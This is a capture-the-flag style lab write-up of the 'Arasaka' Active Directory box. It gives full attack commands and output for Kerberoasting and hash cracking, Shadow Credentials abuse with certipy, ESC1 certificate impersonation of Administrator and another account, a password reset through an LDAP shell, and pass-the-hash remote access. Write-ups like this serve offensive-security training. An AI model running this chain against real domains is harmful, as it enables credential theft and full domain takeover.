---
title: "HSL - Arasaka"
date: 2026-03-20
categories: [HSL, Active Directory]
tags: [Windows, AD, Kerberoasting, Shadow-Credentials, ADCS, ESC1, BloodHound, certipy, Pass-the-Hash]
image:
  path: /assets/img/arasaka/arasaka-banner.png
---



---
## Reconnaissance

### Port Scan

```bash
rustscan -a 10.1.221.39 -- -sC -sV
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl       Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  adws?
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
```

Standard AD environment. Domain is `hacksmarter.local`, DC is `DC01`. Generate the hosts file first:

```bash
nxc smb 10.1.221.39 --generate-hosts-file host
cat host | sudo tee -a /etc/hosts
```

---

## Enumeration — Shares & Kerberoasting

Starting credentials: `faraday:hacksmarter123`

```bash
nxc smb 10.1.221.39 -u faraday -p hacksmarter123 --shares
```

```text
SMB  10.1.221.39  445  DC01  IPC$      READ
SMB  10.1.221.39  445  DC01  NETLOGON  READ
SMB  10.1.221.39  445  DC01  SYSVOL    READ
```

![smb-shares](/assets/img/arasaka/smb-shares.png)

Nothing interesting in shares. Check for Kerberoastable accounts:

```bash
nxc ldap 10.1.221.39 -u faraday -p hacksmarter123 --kerberoasting krbrst
```

```text
[*] sAMAccountName: alt.svc
[*] Total of records returned 1
LDAP  10.1.221.39  389  DC01  $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$...
```

![kerberoast](/assets/img/arasaka/kerberoast.png)

One Kerberoastable account — `alt.svc`. Crack it:

```powershell
PS> .\hashcat.exe -m 13100 .\krbrst .\rockyou.txt
```

```text
$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$...:babygirl1

Status: Cracked
```

Credentials: `alt.svc:babygirl1`

---

## BloodHound — ACL Chain Discovery

```bash
rusthound-ce -d hacksmarter.local -u faraday -p 'hacksmarter123' -c All --zip
```

BloodHound shows a clear two-hop path:

```text
ALT.SVC ──GenericAll──► YORINOBU ──GenericWrite──► SOULKILLER.SVC
```

![bloodhound-chain](/assets/img/arasaka/bloodhound-chain.png)

ADCS is installed on this domain — Shadow Credentials is cleaner than targeted Kerberoasting for both hops.

---

## Shadow Credentials — ALT.SVC → YORINOBU → SOULKILLER.SVC

**Hop 1** — `ALT.SVC` has `GenericAll` over `YORINOBU`. Use certipy to add a Key Credential and retrieve the NT hash:

```bash
certipy shadow auto -target 10.1.221.39 -dc-ip 10.1.221.39 -username ALT.SVC -password 'babygirl1' -account YORINOBU
```

```text
[*] NT hash for 'Yorinobu': 5d21eb21b243284ed2cd8d04ac187c0f
```

![shadow-yorinobu](/assets/img/arasaka/shadow-yorinobu.png)

**Hop 2** — `YORINOBU` has `GenericWrite` over `SOULKILLER.SVC`. Same attack:

```bash
certipy shadow auto -target 10.1.221.39 -dc-ip 10.1.221.39 -username YORINOBU -hashes :5d21eb21b243284ed2cd8d04ac187c0f -account SOULKILLER.SVC
```

```text
[*] NT hash for 'Soulkiller.svc': f4ab68f27303bcb4024650d8fc5f973a
```

![shadow-soulkiller](/assets/img/arasaka/shadow-soulkiller.png)

---

## ADCS — ESC1 Enumeration

`SOULKILLER.SVC` doesn't have any interesting outbound ACL edges in BloodHound — no path forward through the domain that way. Back in BloodHound though, `SOULKILLER.SVC` has a direct `Enroll` edge on the `AI_TAKEOVER` certificate template.

![bloodhound-enroll](/assets/img/arasaka/bloodhound-enroll.png)

ADCS is running — let's check for any misconfigurations:

```bash
certipy find -u SOULKILLER.SVC -hashes :f4ab68f27303bcb4024650d8fc5f973a -target 10.1.221.39 -dc-ip 10.1.221.39 -vuln -stdout
```

```text
Template Name                       : AI_Takeover
Enrollment Rights                   : HACKSMARTER.LOCAL\Soulkiller.svc
[!] Vulnerabilities
  ESC1                              : Enrollee supplies subject and template allows client authentication.
```

![esc1](/assets/img/arasaka/esc1.png)

`SOULKILLER.SVC` has exclusive enrollment rights on the `AI_Takeover` template, which is ESC1 — the enrollee can supply an arbitrary Subject Alternative Name (UPN). This lets us request a certificate impersonating any user in the domain.

---

## ESC1 → Administrator (Method 1)

Request a certificate as Administrator:

```bash
certipy req -dc-ip 10.1.221.39 -username SOULKILLER.SVC@hacksmarter.local -hashes :f4ab68f27303bcb4024650d8fc5f973a -ca hacksmarter-DC01-CA -template AI_Takeover -upn administrator@hacksmarter.local
```

```text
[*] Got certificate with UPN 'administrator@hacksmarter.local'
[*] Saving certificate and private key to 'administrator.pfx'
```

![esc1-req](/assets/img/arasaka/esc1-req.png)

Authenticate with the certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.1.221.39
```

```text
[-] KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

![key-expired](/assets/img/arasaka/key-expired.png)

Administrator's password is expired — Kerberos won't issue a TGT. Use LDAP pass-the-cert to authenticate over LDAPS and reset it directly:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.1.221.39 -domain hacksmarter.local -username administrator -ldap-shell
```

```text
[*] Authenticated to '10.1.221.39' as: 'u:HACKSMARTER\\Administrator'
# change_password administrator Password123!
Password changed successfully!
```

```bash
ewp -i 10.1.221.39 -u administrator -p 'Password123!'
```

```text
evil-winrm-py PS C:\Users\Administrator\Documents>
```

---

## ESC1 → THE_EMPEROR (Method 2)

BloodHound flags `THE_EMPEROR` as a high-value target with no expired password. Request a certificate for that account instead:

![bloodhound-emperor](/assets/img/arasaka/bloodhound-emperor.png)

```bash
certipy req -dc-ip 10.1.221.39 -username SOULKILLER.SVC@hacksmarter.local -hashes :f4ab68f27303bcb4024650d8fc5f973a -ca hacksmarter-DC01-CA -template AI_Takeover -upn THE_EMPEROR@hacksmarter.local
```

```bash
certipy auth -pfx the_emperor.pfx -dc-ip 10.1.221.39
```

```text
[*] Got TGT
[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
```

Pass the hash directly — no password reset needed:

```bash
ewp -i 10.1.221.39 -u THE_EMPEROR -H d87640b0d83dc7f90f5f30bd6789b133
```

---

## Attack Flow

```text
                       hacksmarter.local
                              |
                  [Starting creds: faraday:hacksmarter123]
                              |
                    [nxc ldap --kerberoasting]
                    alt.svc TGS → babygirl1
                              |
                    [BloodHound ACL chain]
             ALT.SVC → GenericAll → YORINOBU
             YORINOBU → GenericWrite → SOULKILLER.SVC
                              |
                  [certipy shadow auto x2]
             YORINOBU NT hash → SOULKILLER.SVC NT hash
                              |
           [BloodHound - Enroll on AI_TAKEOVER template]
                  certipy find -vuln → ESC1
                              |
                  --- Method 1: Administrator ---
                  certipy req -upn administrator
                      KDC_ERR_KEY_EXPIRED
                  certipy auth -ldap-shell
                    change_password → WinRM
                              |
                  --- Method 2: THE_EMPEROR ---
                  certipy req -upn THE_EMPEROR
                    certipy auth → NT hash
                       ewp PTH → shell
                              |
                       DOMAIN COMPROMISED
```
